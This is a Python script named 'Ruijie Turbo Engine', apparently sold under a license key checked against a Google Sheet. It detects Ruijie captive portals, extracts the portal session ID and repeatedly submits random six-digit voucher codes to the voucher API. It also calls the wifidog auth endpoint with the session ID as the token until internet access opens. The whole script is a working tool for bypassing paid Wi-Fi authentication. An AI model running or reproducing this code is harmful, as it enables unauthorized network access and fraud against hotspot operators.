import requests
import re
import time
import random
import string
import os
import sys
from datetime import datetime, date
from urllib.parse import urlparse, parse_qs, urljoin
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# PREMIUM COLOR & STYLE SYSTEM
# ===============================
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===============================
# CONFIG & GLOBALS
# ===============================
SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/1hQIA31FeBIDKXfmyIv8UjDk-ixQEseDy-n7p9oFXphk/export?format=csv"
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")

class Config:
    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    VOUCHER_API = "/api/auth/voucher/"
    USER_AGENT = "Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"

# ===============================
# UI & UTILITY FUNCTIONS
# ===============================
def clear_screen():
    """Clear the terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def log_status(icon, msg, color=WHITE, end="\n"):
    """Print status in a premium format, overwriting the current line cleanly"""
    sys.stdout.write(f"\r\033[2K{BOLD}{color}[ {icon} ] {msg}{RESET}{end}")
    sys.stdout.flush()

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
def get_system_key():
    try: uid = os.geteuid()
    except AttributeError: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys_with_expiry():
    keys_data = {}
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not any(x in line.lower() for x in ['keys', 'username']):
                    parts = line.split(',')
                    if len(parts) >= 1:
                        key = parts[0].strip().strip('"')
                        expiry = parts[2].strip().strip('"') if len(parts) > 2 else ""
                        keys_data[key] = expiry
            with open(LOCAL_KEYS_FILE, 'w') as f:
                for k, v in keys_data.items():
                    f.write(f"{k},{v}\n")
            return keys_data
    except:
        pass
    
    if os.path.exists(LOCAL_KEYS_FILE):
        try:
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    p = line.strip().split(',')
                    if len(p) >= 1: keys_data[p[0]] = p[1] if len(p) > 1 else ""
        except: pass
    return keys_data

def display_premium_ui(system_key, status, expiry, days_left, status_color):
    """Display the Premium UI in a Rounded Box"""
    width = 56
    print(f"\n{CYAN}{BOLD}╭{'─' * (width-2)}╮{RESET}")
    print(f"{CYAN}{BOLD}│{RESET}{BOLD}                 RUIJIE TURBO ENGINE                  {CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}│{RESET}                v2.0 • Premium Edition                {CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}├{'─' * (width-2)}┤{RESET}")
    print(f"{CYAN}{BOLD}│{RESET} ❖ SYSTEM INFORMATION                                 {CYAN}{BOLD}│{RESET}")
    print(f"{CYAN}{BOLD}│{RESET}                                                      {CYAN}{BOLD}│{RESET}")
    
    rows = [
        ("System Key", system_key, WHITE),
        ("License Status", f"[ {status} ]", status_color),
        ("Valid Until", expiry, WHITE),
        ("Remaining Days", days_left, status_color if days_left != "N/A" else WHITE)
    ]
    
    for label, value, color in rows:
        label_text = f"  • {label:14}: "
        val_text = str(value)
        padding = width - len(label_text) - len(val_text) - 2
        print(f"{CYAN}{BOLD}│{RESET}{label_text}{color}{val_text}{RESET}{' ' * padding}{CYAN}{BOLD}│{RESET}")
        
    print(f"{CYAN}{BOLD}╰{'─' * (width-2)}╯{RESET}\n")

def check_approval():
    clear_screen()
    log_status("⟳", "Fetching License Data from Cloud...", CYAN)
    
    system_key = get_system_key()
    authorized_keys_data = fetch_authorized_keys_with_expiry()
    
    status, expiry, days_left = "NOT FOUND", "N/A", "N/A"
    color = RED
    is_approved = False

    if system_key in authorized_keys_data:
        expiry_str = authorized_keys_data[system_key]
        if expiry_str:
            try:
                expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                diff = (expiry_date - date.today()).days
                expiry = expiry_str
                
                if diff < 0:
                    status, days_left, color = "EXPIRED", "0 Days", RED
                else:
                    status, days_left, color, is_approved = "APPROVED", f"{diff} Days", GREEN, True
            except:
                status, color, is_approved = "APPROVED (Format Err)", YELLOW, True
        else:
            status, expiry, days_left, color, is_approved = "APPROVED", "LIFETIME", "∞", GREEN, True

    clear_screen()
    display_premium_ui(system_key, status, expiry, days_left, color)
    
    if not is_approved:
        if status == "EXPIRED":
            log_status("!", "Your Key has expired. Please contact the Admin.", YELLOW)
        else:
            log_status("!", "Please get approval from the Admin.", YELLOW)
        return False
    return True

# ===============================
# CORE BYPASS ENGINE
# ===============================
class RuijieBypassPremium:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": Config.USER_AGENT})
        self.sid = None
        self.portal_host = None
        self.gw_addr = None
        self.gw_port = None

    def check_internet(self):
        """Check if internet is active."""
        try:
            r = requests.get(Config.TEST_URL, timeout=5)
            return r.status_code == 204
        except:
            return False

    def detect_portal(self):
        """Detect captive portal and extract info."""
        log_status("🔍", "Scanning for Captive Portal...", YELLOW, end="")
        try:
            r = self.session.get(Config.TEST_URL, allow_redirects=True, timeout=10)
            if r.url == Config.TEST_URL:
                return False, "Internet is already active."
            
            portal_url = r.url
            parsed_url = urlparse(portal_url)
            self.portal_host = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            params = parse_qs(parsed_url.query)
            self.gw_addr = params.get('gw_address', [None])[0]
            self.gw_port = params.get('gw_port', [None])[0]
            
            log_status("➤", f"Portal Detected: {self.portal_host}", MAGENTA)
            return True, portal_url
        except Exception as e:
            return False, str(e)

    def extract_sid(self, portal_url):
        """Extract Session ID (sid)."""
        log_status("⟳", "Extracting Session ID...", CYAN, end="")
        try:
            r1 = self.session.get(portal_url, verify=False, timeout=10)
            
            js_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            if js_match:
                next_url = urljoin(portal_url, js_match.group(1))
                r1 = self.session.get(next_url, verify=False, timeout=10)

            query_params = parse_qs(urlparse(r1.url).query)
            self.sid = query_params.get('sessionId', [None])[0]
            
            if not self.sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r1.text)
                if sid_match:
                    self.sid = sid_match.group(1)

            if self.sid:
                log_status("✓", f"Session Locked: {self.sid[:12]}...", GREEN)
                return True
            else:
                return False
        except Exception as e:
            log_status("!", f"SID Extraction Error: {e}", RED)
            return False

    def login_with_voucher(self, voucher=None):
        """Attempt bypass."""
        if not self.sid:
            log_status("!", "No Session ID found.", RED)
            return False

        if not voucher:
            voucher = "".join(random.choices(string.digits, k=6))
        
        log_status("🚀", f"Attempting Bypass with Voucher: {voucher}", CYAN)
        
        try:
            api_url = f"{self.portal_host}{Config.VOUCHER_API}"
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            res = self.session.post(api_url, json=payload, timeout=10)
        except:
            pass

        if self.gw_addr and self.gw_port:
            auth_link = f"http://{self.gw_addr}:{self.gw_port}/wifidog/auth?token={self.sid}&phonenumber=12345"
            try:
                self.session.get(auth_link, timeout=5)
            except:
                pass

        time.sleep(2)
        if self.check_internet():
            log_status("✓", "BYPASS SUCCESSFUL! Internet is now active.", GREEN)
            return True
        else:
            log_status("✗", "Bypass Failed.", RED)
            return False

    def run(self):
        print(f"{YELLOW}  [ Press {BOLD}Ctrl + C{RESET}{YELLOW} to stop the engine ]{RESET}\n")
        
        while True:
            # Step 1: Monitor Internet Connection
            if self.check_internet():
                log_status("✓", "Network Active. Monitoring connection...", GREEN)
                while self.check_internet():
                    time.sleep(10)
                print()
                log_status("!", "Connection lost! Restarting bypass process...", YELLOW)

            # Step 2: Detect Portal
            success, portal_url = self.detect_portal()
            if not success:
                log_status("⟳", "Retrying in 5 seconds...", YELLOW)
                time.sleep(5)
                continue

            # Step 3: Extract SID and Loop Bypass Attempts
            if self.extract_sid(portal_url):
                attempt = 1
                while True: 
                    log_status("↻", f"Bypass Attempt: {attempt}", MAGENTA)
                    if self.login_with_voucher():
                        break 
                    time.sleep(3)
                    attempt += 1
            else:
                log_status("!", "Could not capture Session ID. Retrying in 5 seconds...", RED)
                time.sleep(5)

if __name__ == "__main__":
    try:
        if check_approval():
            engine = RuijieBypassPremium()
            engine.run()
        else:
            sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n\n{RED}{BOLD}[ ⏹ ] Engine Stopped by User. Exiting...{RESET}")
        sys.exit(0)
